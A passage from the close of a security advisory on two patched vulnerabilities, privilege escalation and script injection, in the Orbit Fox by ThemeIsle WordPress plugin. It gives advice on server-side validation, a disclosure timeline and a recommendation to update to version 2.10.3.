**Never rely solely on client-side validation.** Client-side validation is not fool proof. Because client-side validation is performed on a user’s computer within their browser, requests can be intercepted once they’ve left the user’s browser prior to being processed by the server. A browser-based script can strip cross-site scripting tags from the request being sent from the browser, however, an attacker can intercept the request and re-add the scripting tags back in. If there is no server-side validation, these scripting tags will be accepted and used despite the client-side protections in place. Attackers familiar with an application can also programmatically generate requests and form input, bypassing client-side protections altogether in order to interact with a site.

For that reason, we recommend always using server-side validation on requests. Client-side validation should be used as a supplement when necessary. This will prevent requests from being altered in transit from the browser to the server and inhibit any bypasses to client-side protections that are in place.

## Disclosure Timeline

**November 19, 2020** – Conclusion of the plugin analysis that led to the discovery of two vulnerabilities in the Orbit Fox by ThemeIsle plugin.

**November 19, 2020** – We develop firewall rules to protect Wordfence customers and release them to Wordfence Premium users. We initiate contact with the plugin’s developer.

**November 23, 2020** – The plugin’s developer confirms the inbox for handling discussion.

**November 24, 2020** – We submit full disclosure.

**December 8, 2020** – We follow up as we have not yet received a response from our disclosure.

**December 15, 2020** – We send our final follow-up indicating that we will need to escalate the process per our disclosure guidelines if no response is received by December 18th.

**December 17, 2020** – We receive a response and a patched version of the plugin is released as version 2.10.3. We verify that the vulnerabilities have been patched.

**December 19, 2020** – Free Wordfence users receive firewall rule.

## Conclusion

In today’s post, we detailed two flaws in Orbit Fox by ThemeIsle that granted attackers the ability to escalate privileges and inject potentially malicious JavaScript into posts. These flaws have been fully patched in version 2.10.3. We recommend that users immediately update to the latest version available, which is version 2.10.3 at the time of this publication.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210112&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received firewall rules protecting against these vulnerabilities on November 19, 2020, while those still using the free version of Wordfence received the same protection on December 19, 2020.

If you know a friend or colleague who is using this plugin on their site, we highly recommend forwarding this advisory to them to help keep their sites protected as these are critical and high severity vulnerabilities that can lead to full site takeover.

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F01%2Fmultiple-vulnerabilities-patched-in-orbit-fox-by-themeisle-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F01%2Fmultiple-vulnerabilities-patched-in-orbit-fox-by-themeisle-plugin%2F&text=Multiple%20Vulnerabilities%20Patched%20in%20Orbit%20Fox%20by%20ThemeIsle%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F01%2Fmultiple-vulnerabilities-patched-in-orbit-fox-by-themeisle-plugin%2F)

## Comments

1 Comment

* ![](https://secure.gravatar.com/avatar/e3924a53f2d6216a618fe650a6613986?s=96&d=mm&r=g)
  chocolatePB
  January 12, 2021
   11:29 am

  Yay Chloe! Thank you for the information, great post!

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


